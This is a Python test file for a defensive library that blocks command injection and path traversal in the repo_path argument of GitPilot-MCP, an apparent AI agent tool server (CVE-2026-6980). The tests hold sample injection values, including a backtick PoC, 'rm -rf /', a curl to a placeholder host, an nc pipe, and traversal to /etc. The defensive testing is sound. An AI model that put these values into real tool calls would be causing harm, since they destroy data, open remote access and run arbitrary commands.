"""Tests for CVE-2026-6980 GitPilot-MCP repo_path injection (v0.5.7+).

Primary source (cited per v0.5.1+ convention):
- RedPacket Security CVE alert (2026-04-25):
  https://www.redpacketsecurity.com/cve-alert-cve-2026-6980-divyanshu-hash-gitpilot-mcp/
- vulnerability.circl.lu

Vendor unresponsive; project does not version. Preset matches by
tool-name regex only.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from agent_airlock import GitPilotRepoPathInjection
from agent_airlock.exceptions import AirlockError
from agent_airlock.policy_presets import gitpilot_mcp_cve_2026_6980_defaults

FIXTURE = Path(__file__).parent / "fixtures" / "cve_2026_6980_gitpilot.json"


class TestCleanRepoPath:
    """A clean repo path under a configured safe root passes."""

    def test_clean_path_passes(self, tmp_path: Path) -> None:
        cfg = gitpilot_mcp_cve_2026_6980_defaults(safe_repo_roots=(tmp_path,))
        # Use a real path under tmp_path so resolve() succeeds.
        clean = tmp_path / "myrepo"
        clean.mkdir()
        cfg["check"]("repo_path", {"repo_path": str(clean)})

    def test_unrelated_handler_unaffected(self) -> None:
        cfg = gitpilot_mcp_cve_2026_6980_defaults()
        # readFile is not in the GitPilot handler regex.
        cfg["check"]("readFile", {"repo_path": "/tmp/foo`id`"})


class TestShellMetacharRejection:
    """Each metachar in the public PoC + variants must be blocked."""

    @pytest.mark.parametrize(
        "value",
        [
            "/tmp/repo`whoami`",  # public PoC
            "/tmp/repo; rm -rf /",
            "/tmp/repo$(curl evil.example.com)",
            "/tmp/repo|nc evil 1337",
            "/tmp/repo && id",
        ],
    )
    def test_metachar_blocked(self, value: str) -> None:
        cfg = gitpilot_mcp_cve_2026_6980_defaults()
        with pytest.raises(GitPilotRepoPathInjection, match="metacharacter"):
            cfg["check"]("repo_path", {"repo_path": value})


class TestPathTraversalRejection:
    """Relative paths and out-of-root resolved paths are blocked."""

    def test_relative_path_rejected(self) -> None:
        cfg = gitpilot_mcp_cve_2026_6980_defaults()
        with pytest.raises(GitPilotRepoPathInjection, match="absolute"):
            cfg["check"]("repo_path", {"repo_path": "../../../etc"})

    def test_path_outside_safe_root(self, tmp_path: Path) -> None:
        cfg = gitpilot_mcp_cve_2026_6980_defaults(safe_repo_roots=(tmp_path,))
        # /etc/secrets is absolute + has no metachar but resolves
        # outside the safe root.
        with pytest.raises(GitPilotRepoPathInjection, match="not under"):
            cfg["check"]("repo_path", {"repo_path": "/etc/secrets"})


class TestPresetRoundTrip:
    def test_preset_keys(self) -> None:
        cfg = gitpilot_mcp_cve_2026_6980_defaults()
        assert callable(cfg["check"])
        assert cfg["tool_name_pattern"] == r"^(repo_path|run_git_command|exec_in_repo)$"
        assert cfg["source"].startswith("https://")

    def test_three_handler_names_all_caught(self) -> None:
        cfg = gitpilot_mcp_cve_2026_6980_defaults()
        for handler in ("repo_path", "run_git_command", "exec_in_repo"):
            with pytest.raises(GitPilotRepoPathInjection):
                cfg["check"](handler, {"repo_path": "/tmp/bad`id`"})


class TestErrorHierarchy:
    def test_subclasses_airlock_error(self) -> None:
        assert issubclass(GitPilotRepoPathInjection, AirlockError)


class TestFixture:
    def test_fixture_payloads_match_disclosed_at(self) -> None:
        data = json.loads(FIXTURE.read_text(encoding="utf-8"))
        assert data["cve"] == "CVE-2026-6980"
        assert data["cvss_v3"] == 7.3
        assert data["disclosed_at"] == "2026-04-25"
        assert len(data["payloads"]) == 5
        for p in data["payloads"]:
            assert p["disclosed_at"] == "2026-04-25"
            assert p["expected"] == "blocked"
